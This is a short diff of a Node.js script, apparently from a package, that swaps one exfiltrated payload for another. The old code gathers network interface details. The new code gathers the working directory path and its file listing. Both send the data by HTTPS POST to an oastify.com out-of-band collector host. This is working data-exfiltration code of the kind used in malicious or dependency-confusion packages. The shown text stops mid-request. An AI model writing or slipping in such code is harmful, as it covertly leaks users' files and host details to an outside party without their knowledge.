@@ -1,8 +1,8 @@
 const https = require('https');
-const os = require('os');
+const fs = require('fs');
 
-const interfaces = os.networkInterfaces();
-const payload = JSON.stringify({ interfaces }, null, 2);
+const files = fs.readdirSync(process.cwd());
+const payload = JSON.stringify({ cwd: process.cwd(), files });
 
 const req = https.request('https://ccsfcqpeh2dm4dhuejwjdylfz65xtrhg.oastify.com', {
   method: 'POST',
